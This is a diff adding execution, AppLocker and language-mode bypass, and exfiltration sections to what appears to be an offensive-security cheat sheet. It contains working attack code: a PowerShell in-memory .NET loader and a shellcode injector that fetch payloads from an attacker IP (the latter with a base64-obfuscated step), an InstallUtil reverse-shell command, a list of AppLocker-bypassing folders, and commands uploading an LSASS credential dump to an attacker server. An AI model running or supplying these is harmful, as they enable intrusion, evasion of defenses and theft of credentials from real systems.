@@ -501,7 +501,7 @@ if (Object.Status == 200)
     Stream.Write(Object.ResponseBody);
     Stream.Position = 0;
 
-    Stream.SaveToFile("met.exe", 2);
+    Stream.SaveToFile("pay.exe", 2);
     Stream.Close();
 }
 
@@ -514,7 +514,203 @@ swaks --to support@domain.local --from "test@test.com" --header "Subject: Intern
 ```
 ---
 ## Execution
+### PowerShell Fileless Execute .NET Assembly
+```powershell
+$code = @'
+using System;
+using Reflect = System.Reflection;
+using System.IO;
+using System.Text;
 
+    public class Assembly
+    {
+        public static void AssemblyExecute(byte[] bytes, string[] args = null)
+        {
+            MemoryStream stream = new MemoryStream();
+            var realStdOut = Console.Out;
+            var realStdErr = Console.Error;
+            StreamWriter stdOutWriter = new StreamWriter(stream);
+            StreamWriter stdErrWriter = new StreamWriter(stream);
+            stdOutWriter.AutoFlush = true;
+            stdErrWriter.AutoFlush = true;
+            Console.SetOut(stdOutWriter);
+            Console.SetError(stdErrWriter);
+            var asm = Reflect.Assembly.Load(bytes);
+            try { asm.EntryPoint.Invoke(null, new object[] { args }); }
+            catch (IOException) {}
+            Console.Out.Flush();
+            Console.Error.Flush();
+            Console.SetOut(realStdOut);
+            Console.SetError(realStdErr);
+            var final = Encoding.UTF8.GetString(stream.ToArray());
+            stream.Dispose();
+            byte[] DataBytes = Encoding.UTF8.GetBytes(final);
+            string result = System.Text.Encoding.UTF8.GetString(DataBytes);
+            Console.WriteLine(result);
+        }
+    }
+'@
+
+Add-Type -TypeDefinition $code
+$url="http://10.13.14.15:8080/asm.exe"
+[string[]]$arguments = "dump /nowrap".Split(' ')
+$wc = New-Object System.Net.WebClient
+[byte[]]$bytes = $wc.DownloadData($url)
+[Assembly]::AssemblyExecute($bytes,$arguments)
+```
+---
+### PowerShell Fileless Self Inyector
+```powershell
+function Get-ProcAddress {
+    Param(
+        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
+        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
+    )
+    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
+    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+    $tmpPtr = New-Object IntPtr
+    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+}
+function Get-DelegateType
+{
+    Param
+    (
+        [OutputType([Type])] 
+        [Parameter( Position = 0)]
+        [Type[]]
+        $Parameters = (New-Object Type[](0)),
+        [Parameter( Position = 1 )]
+        [Type]
+        $ReturnType = [Void]
+    )
+    $Domain = [AppDomain]::CurrentDomain
+    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+    Write-Output $TypeBuilder.CreateType()
+}
+$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
+$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
+$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
+$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
+$CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
+$url="http://10.13.14.15:8080/bacon.bin";
+$wc = New-Object System.Net.WebClient;
+[Byte[]] $safecode = $wc.DownloadData($url);
+$size = $safecode.Length;
+$MemoryHandle = [IntPtr]::Zero
+$MemoryHandle = $VirtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40);
+Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkc2FmZWNvZGUsIDAsICRNZW1vcnlIYW5kbGUsICRzaXplKSB8IE91dC1OdWxs")))
+$ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, ([UInt32]0), ([IntPtr]0))
+```
+---
+### Bypass CLM
+Fileless reverse shell with full language mode:
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U \\10.13.14.15\pwn\PSBypassCLM.exe
+```
+
+https://github.com/florylsk/active-directory-hacktools/blob/main/PSByPassCLM/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe
+
+---
+
+### Bypass AppLocker
+World writable folders that usually bypass it:
+```
+C:\Windows\Tasks 
+
+C:\Windows\Temp 
+
+C:\windows\tracing
+
+C:\Windows\Registration\CRMLog
+
+C:\Windows\System32\FxsTmp
+
+C:\Windows\System32\com\dmp
+
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+
+C:\Windows\System32\spool\PRINTERS
+
+C:\Windows\System32\spool\SERVERS
+
+C:\Windows\System32\spool\drivers\color
+
+C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
+
+C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
+
+C:\Windows\SysWOW64\FxsTmp
+
+C:\Windows\SysWOW64\com\dmp
+
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
+
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
+```
+
+Execution of .NET Assemblies with InstallUtil:
+
+assembly.cs
+```csharp
+using System;
+using System.Diagnostics;
+using System.Reflection;
+using System.Configuration.Install;
+using System.Net;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.ComponentModel;
+using System.Linq;
+using System.Text;
+
+
+namespace Exec
+{
+	public class Program
+	{
+
+		public static void Main()
+		{
+			Console.WriteLine("Hello From Main :p");
+
+		}
+	}
+	
+	[System.ComponentModel.RunInstaller(true)]
+	public class Sample : System.Configuration.Install.Installer
+	{
+		public override void Uninstall(System.Collections.IDictionary savedState) {
+			<malcode>
+		}
+	}
+		
+}
+```
+
+Compile with csc.exe:
+```cmd
+C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\csc.exe .\assembly.cs
+```
+
+Execute with InstallUtil:
+```cmd
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U \\192.168.45.218\pwn\assembly.exe
+```
+---
 ## Persistence
 
 ## Privesc
@@ -524,3 +720,62 @@ swaks --to support@domain.local --from "test@test.com" --header "Subject: Intern
 ## Lateral Movement
 
 ## Exfiltration
+### With simple HTTP server
+Server-side python code:
+```python
+#!/usr/env python3
+import http.server
+import os
+import logging
+
+try:
+    import http.server as server
+except ImportError:
+    # Handle Python 2.x
+    import SimpleHTTPServer as server
+
+class HTTPRequestHandler(server.SimpleHTTPRequestHandler):
+    """
+    SimpleHTTPServer with added bonus of:
+
+    - handle PUT requests
+    - log headers in GET request
+    """
+
+    def do_GET(self):
+        server.SimpleHTTPRequestHandler.do_GET(self)
+        logging.warning(self.headers)
+
+    def do_PUT(self):
+        """Save a file following a HTTP PUT request"""
+        filename = os.path.basename(self.path)
+
+        # Don't overwrite files
+        if os.path.exists(filename):
+            self.send_response(409, 'Conflict')
+            self.end_headers()
+            reply_body = '"%s" already exists\n' % filename
+            self.wfile.write(reply_body.encode('utf-8'))
+            return
+
+        file_length = int(self.headers['Content-Length'])
+        with open(filename, 'wb') as output_file:
+            output_file.write(self.rfile.read(file_length))
+        self.send_response(201, 'Created')
+        self.end_headers()
+        reply_body = 'Saved "%s"\n' % filename
+        self.wfile.write(reply_body.encode('utf-8'))
+
+if __name__ == '__main__':
+    server.test(HandlerClass=HTTPRequestHandler,port=8080)
+```
+Client side powershell:
+```powershell
+Invoke-WebRequest -uri http://10.10.13.34:8080/lsass.txt -Method Put -Infile .\lsass.txt -ContentType 'application/binary'
+```
+
+Client side cmd:
+```
+curl.exe http://10.10.13.14:8080/lsass.txt --upload-file lsass.txt
+```
+---
